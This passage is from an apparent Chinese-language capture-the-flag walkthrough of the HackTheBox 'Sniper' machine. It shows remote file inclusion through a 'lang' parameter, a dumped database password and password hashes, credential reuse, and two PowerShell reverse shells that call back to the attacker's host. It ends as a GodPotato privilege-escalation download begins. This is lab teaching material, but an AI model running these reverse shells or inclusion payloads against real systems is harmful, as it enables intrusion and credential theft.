+</span></span><span style="display:flex;"><span>04/11/2019  05:22 PM             2,635 index.php
+</span></span><span style="display:flex;"><span>04/11/2019  05:23 AM    &lt;DIR&gt;          js
+</span></span><span style="display:flex;"><span>04/11/2019  05:23 AM    &lt;DIR&gt;          scss
+</span></span><span style="display:flex;"><span>10/01/2019  08:44 AM    &lt;DIR&gt;          user
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">1</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>          2,635 bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">8</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   2,419,822,592 bytes free
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span></code></pre></div><p>继续枚举其他文件加，发现 <code>db.php</code>，很可能是数据库的连接文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -s -G <span style="color:#e6db74">&#39;http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php&#39;</span> --data-urlencode <span style="color:#e6db74">&#39;cmd=dir C:\inetpub\wwwroot\user&#39;</span>
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span> Directory of C:<span style="color:#ae81ff">\i</span>netpub<span style="color:#ae81ff">\w</span>wwroot<span style="color:#ae81ff">\u</span>ser
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>10/01/2019  08:44 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>10/01/2019  08:44 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>04/11/2019  05:15 PM               <span style="color:#ae81ff">108</span> auth.php
+</span></span><span style="display:flex;"><span>04/11/2019  05:52 AM    &lt;DIR&gt;          css
+</span></span><span style="display:flex;"><span>04/11/2019  10:51 AM               <span style="color:#ae81ff">337</span> db.php
+</span></span><span style="display:flex;"><span>04/11/2019  05:23 AM    &lt;DIR&gt;          fonts
+</span></span><span style="display:flex;"><span>04/11/2019  05:23 AM    &lt;DIR&gt;          images
+</span></span><span style="display:flex;"><span>04/11/2019  06:18 AM             4,639 index.php
+</span></span><span style="display:flex;"><span>04/11/2019  05:23 AM    &lt;DIR&gt;          js
+</span></span><span style="display:flex;"><span>04/11/2019  06:10 AM             6,463 login.php
+</span></span><span style="display:flex;"><span>04/08/2019  11:04 PM               <span style="color:#ae81ff">148</span> logout.php
+</span></span><span style="display:flex;"><span>10/01/2019  08:42 AM             7,192 registration.php
+</span></span><span style="display:flex;"><span>08/14/2019  10:35 PM             7,004 registration_old123123123847.php
+</span></span><span style="display:flex;"><span>04/11/2019  05:23 AM    &lt;DIR&gt;          vendor
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">7</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>         25,891 bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">7</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   2,419,822,592 bytes free
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span></code></pre></div><p>读取 <code>db.php</code>，发现凭据 <code>$con = mysqli_connect(&quot;localhost&quot;,&quot;dbuser&quot;,&quot;36mEAhz/B8xQ~2VM&quot;,&quot;sniper&quot;);</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -s -G <span style="color:#e6db74">&#39;http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php&#39;</span> --data-urlencode <span style="color:#e6db74">&#39;cmd=type C:\inetpub\wwwroot\user\db.php&#39;</span>
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>// Enter your Host, username, password, database below.
+</span></span><span style="display:flex;"><span>// I left password empty because i <span style="color:#66d9ef">do</span> not set password on localhost.
+</span></span><span style="display:flex;"><span>$con <span style="color:#f92672">=</span> mysqli_connect<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;localhost&#34;</span>,<span style="color:#e6db74">&#34;dbuser&#34;</span>,<span style="color:#e6db74">&#34;36mEAhz/B8xQ~2VM&#34;</span>,<span style="color:#e6db74">&#34;sniper&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>// Check connection
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>mysqli_connect_errno<span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;Failed to connect to MySQL: &#34;</span> . mysqli_connect_error<span style="color:#f92672">()</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>?&gt;
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span></code></pre></div><p>把连接串写成一个查询脚本。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat dump.php
+</span></span><span style="display:flex;"><span>&lt;?php
+</span></span><span style="display:flex;"><span>$m <span style="color:#f92672">=</span> new mysqli<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;localhost&#34;</span>,<span style="color:#e6db74">&#34;dbuser&#34;</span>,<span style="color:#e6db74">&#34;36mEAhz/B8xQ~2VM&#34;</span>,<span style="color:#e6db74">&#34;sniper&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$m-&gt;connect_error<span style="color:#f92672">)</span> <span style="color:#f92672">{</span> die<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;conn fail: &#34;</span>.$m-&gt;connect_error<span style="color:#f92672">)</span>; <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;== tables ==\n&#34;</span>;
+</span></span><span style="display:flex;"><span>$r <span style="color:#f92672">=</span> $m-&gt;query<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;show tables&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span>$row <span style="color:#f92672">=</span> $r-&gt;fetch_row<span style="color:#f92672">())</span> <span style="color:#f92672">{</span> echo $row<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>.<span style="color:#e6db74">&#34;\n&#34;</span>; <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;== users ==\n&#34;</span>;
+</span></span><span style="display:flex;"><span>$r <span style="color:#f92672">=</span> $m-&gt;query<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;select * from users&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$r<span style="color:#f92672">)</span> <span style="color:#f92672">{</span> <span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span>$row <span style="color:#f92672">=</span> $r-&gt;fetch_assoc<span style="color:#f92672">())</span> <span style="color:#f92672">{</span> print_r<span style="color:#f92672">(</span>$row<span style="color:#f92672">)</span>; <span style="color:#f92672">}</span> <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span> echo <span style="color:#e6db74">&#34;query err: &#34;</span>.$m-&gt;error.<span style="color:#e6db74">&#34;\n&#34;</span>; <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>执行这个脚本得到 <code>superuser</code> 的 md5 密码，但是爆破出来。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -s <span style="color:#e6db74">&#39;http://10.129.229.6/blog/?lang=//10.10.16.151/share/dump.php&#39;</span>
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span> tables <span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>users
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==</span> users <span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>Array
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>id<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>username<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; superuser
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>email<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; admin@sniper.co
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>password<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; 6e573c8b25e9168e0c61895d821a3d57
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>trn_date<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; 2019-04-11 22:45:36
+</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Array
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>id<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>username<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; enil
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>email<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; enil@enil.com
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>password<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; e41555b54d0dd8788d9b001f91972e40
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>trn_date<span style="color:#f92672">]</span> <span style="color:#f92672">=</span>&gt; 2026-10-08 02:13:18
+</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Array
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>.....
+</span></span><span style="display:flex;"><span>&lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span></code></pre></div><p>尝试一下 chris 的密码有没有复用 <code>36mEAhz/B8xQ~2VM</code>，真的复用了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb 10.129.229.6 -u chris -p <span style="color:#e6db74">&#39;36mEAhz/B8xQ~2VM&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.229.6    <span style="color:#ae81ff">445</span>    SNIPER           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:SNIPER<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:Sniper<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.229.6    <span style="color:#ae81ff">445</span>    SNIPER           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sniper<span style="color:#ae81ff">\c</span>hris:36mEAhz/B8xQ~2VM
+</span></span></code></pre></div><h2 id="smb-探索">SMB 探索</h2>
+<p>列出 chris 下的共享文件，只有 <code>IPC$</code> 可读。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb 10.129.229.6 -u chris -p <span style="color:#e6db74">&#39;36mEAhz/B8xQ~2VM&#39;</span> --shares
+</span></span><span style="display:flex;"><span>SMB         10.129.229.6    <span style="color:#ae81ff">445</span>    SNIPER           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:SNIPER<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:Sniper<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.229.6    <span style="color:#ae81ff">445</span>    SNIPER           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sniper<span style="color:#ae81ff">\c</span>hris:36mEAhz/B8xQ~2VM
+</span></span><span style="display:flex;"><span>SMB         10.129.229.6    <span style="color:#ae81ff">445</span>    SNIPER           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.129.229.6    <span style="color:#ae81ff">445</span>    SNIPER           Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.129.229.6    <span style="color:#ae81ff">445</span>    SNIPER           -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.129.229.6    <span style="color:#ae81ff">445</span>    SNIPER           ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.129.229.6    <span style="color:#ae81ff">445</span>    SNIPER           C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.129.229.6    <span style="color:#ae81ff">445</span>    SNIPER           IPC$            READ            Remote IPC
+</span></span></code></pre></div><p>写一个连接脚本。</p>
+<p>解释一下：</p>
+<ul>
+<li>新建一个 .NET 的 <code>TcpClient</code> 对象，构造时直接连接 kali。</li>
+<li><code>$c.GetStream()</code> 拿到这条连接的 <code>NetworkStream</code>，后面的读写都走它。</li>
+<li>0..65535 表示生成 65536 个数 ，<code>%{0}</code> 是 <code>ForEach-Object</code> 的别名，把每个都映射成 0，得到一个长度 65536，全是 0 的数组，也就是接收缓冲区。</li>
+</ul>
+<p>这段 PowerShell 不落地任何工具，自己开一条 TCP 连回 Kali，把收到的每一行当命令执行，再把输出和提示符一起发回来。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat rev.ps1
+</span></span><span style="display:flex;"><span>$c <span style="color:#f92672">=</span> New-Object Net.Sockets.TcpClient<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;10.10.16.151&#34;</span>,4444<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$s <span style="color:#f92672">=</span> $c.GetStream<span style="color:#f92672">()</span>; <span style="color:#f92672">[</span>byte<span style="color:#f92672">[]]</span>$b <span style="color:#f92672">=</span> 0..65535 | %<span style="color:#f92672">{</span>0<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#f92672">((</span>$i <span style="color:#f92672">=</span> $s.Read<span style="color:#f92672">(</span>$b,0,$b.Length<span style="color:#f92672">))</span> -ne 0<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  $d <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>New-Object Text.ASCIIEncoding<span style="color:#f92672">)</span>.GetString<span style="color:#f92672">(</span>$b,0,$i<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  $r <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>iex $d 2&gt;&amp;<span style="color:#ae81ff">1</span> | Out-String<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  $sb <span style="color:#f92672">=</span> <span style="color:#f92672">([</span>text.encoding<span style="color:#f92672">]</span>::ASCII<span style="color:#f92672">)</span>.GetBytes<span style="color:#f92672">(</span>$r + <span style="color:#e6db74">&#34;PS&gt; &#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  $s.Write<span style="color:#f92672">(</span>$sb,0,$sb.Length<span style="color:#f92672">)</span>; $s.Flush<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>执行这个脚本得到 iusr 的交互 bash。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -s -G <span style="color:#e6db74">&#39;http://10.129.229.6/blog/?lang=//10.10.16.151/share/shell.php&#39;</span> --data-urlencode <span style="color:#e6db74">&#39;cmd=powershell -NoProfile -ExecutionPolicy Bypass -File \\10.10.16.151\share\rev.ps1&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo rlwrap -cAr nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.151<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.229.6<span style="color:#f92672">]</span> <span style="color:#ae81ff">49904</span>
+</span></span><span style="display:flex;"><span>PS&gt; whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\i</span>usr
+</span></span></code></pre></div><h2 id="提权至-chris">提权至 chris</h2>
+<p>写一个提权到 chris 的脚本。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat rev-c.ps1
+</span></span><span style="display:flex;"><span>$c <span style="color:#f92672">=</span> New-Object Net.Sockets.TcpClient<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;10.10.16.151&#34;</span>,4445<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$s <span style="color:#f92672">=</span> $c.GetStream<span style="color:#f92672">()</span>; <span style="color:#f92672">[</span>byte<span style="color:#f92672">[]]</span>$b <span style="color:#f92672">=</span> 0..65535 | %<span style="color:#f92672">{</span>0<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#f92672">((</span>$i <span style="color:#f92672">=</span> $s.Read<span style="color:#f92672">(</span>$b,0,$b.Length<span style="color:#f92672">))</span> -ne 0<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  $d <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>New-Object Text.ASCIIEncoding<span style="color:#f92672">)</span>.GetString<span style="color:#f92672">(</span>$b,0,$i<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  $r <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>iex $d 2&gt;&amp;<span style="color:#ae81ff">1</span> | Out-String<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  $sb <span style="color:#f92672">=</span> <span style="color:#f92672">([</span>text.encoding<span style="color:#f92672">]</span>::ASCII<span style="color:#f92672">)</span>.GetBytes<span style="color:#f92672">(</span>$r + <span style="color:#e6db74">&#34;PS&gt; &#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  $s.Write<span style="color:#f92672">(</span>$sb,0,$sb.Length<span style="color:#f92672">)</span>; $s.Flush<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>在 iusr 的环境中执行这些命令，解释一下：</p>
+<ul>
+<li>将明文密码转换为 SecureString，其中 <code>AsPlainText</code> 表示给的输入是明文，<code>Force</code> 表示跳过安全提示。</li>
+<li>用用户名和 SecureString 组装一个 PSCredential，这是 Powershell 各 cmdlet 认的凭据包。</li>
+<li>在指定凭据下执行一段代码，<code>ComputerName</code> 指定为 <code>localhost</code>，用 chris 的身份去验证，<code>ScriptBlock</code> 后面跟上要跑的内容。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS&gt; $pass <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#39;36mEAhz/B8xQ~2VM&#39;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>PS&gt; $cred <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;SNIPER\chris&#39;</span>, $pass<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PS&gt; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock <span style="color:#f92672">{</span> powershell -NoProfile -ExecutionPolicy Bypass -File <span style="color:#ae81ff">\\</span>10.10.16.151<span style="color:#ae81ff">\s</span>hare<span style="color:#ae81ff">\r</span>ev-c.ps1 <span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>kali 起一个监听，拿到 chris 的 bash 环境。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo rlwrap -cAr nc -lvnp <span style="color:#ae81ff">4445</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4445</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.151<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.229.6<span style="color:#f92672">]</span> <span style="color:#ae81ff">49909</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>sniper<span style="color:#ae81ff">\c</span>hris
+</span></span><span style="display:flex;"><span>PS&gt; 
+</span></span></code></pre></div><p>枚举 C 盘下的目录，发现一个 <code>Docs</code> 文件夹。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name                                              
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----                                              
+</span></span><span style="display:flex;"><span>d-----        10/1/2019   1:04 PM                Docs                                              
+</span></span><span style="display:flex;"><span>d-----         4/9/2019   7:07 AM                inetpub                                           
+</span></span><span style="display:flex;"><span>d-----        4/11/2019   6:44 AM                Microsoft                                         
+</span></span><span style="display:flex;"><span>d-----        9/15/2018  12:19 AM                PerfLogs                                          
+</span></span><span style="display:flex;"><span>d-r---        4/29/2022   1:18 PM                Program Files                                     
+</span></span><span style="display:flex;"><span>d-----        8/14/2019  10:38 PM                Program Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>                               
+</span></span><span style="display:flex;"><span>d-r---        4/11/2019   7:04 AM                Users                                             
+</span></span><span style="display:flex;"><span>d-----        4/29/2022   1:19 PM                Windows  
+</span></span></code></pre></div><p>枚举发现一个 txt 文件和一个 pdf。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\D</span>ocs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name                                              
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----                                              
+</span></span><span style="display:flex;"><span>-a----        4/11/2019   9:31 AM            <span style="color:#ae81ff">285</span> note.txt                                          
+</span></span><span style="display:flex;"><span>-a----        4/11/2019   9:17 AM         <span style="color:#ae81ff">552607</span> php <span style="color:#66d9ef">for</span> dummies-trial.pdf                         
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS&gt; type note.txt
+</span></span><span style="display:flex;"><span>Hi Chris,
+</span></span><span style="display:flex;"><span>        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you<span style="color:#e6db74">&#39;ve prepared the documentation for our new app. Drop it here when you&#39;</span>re <span style="color:#66d9ef">done</span> with it.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Regards,
+</span></span><span style="display:flex;"><span>Sniper CEO.
+</span></span></code></pre></div><h2 id="提权至-administrator">提权至 administrator</h2>
+<p>前面 iusr 如果执行 <code>whoami /priv</code> 会发现可以进行 Potato 提权。</p>
+<p>下载 <code>GodPotato</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sniper<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -sL -o GodPotato-NET4.exe https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
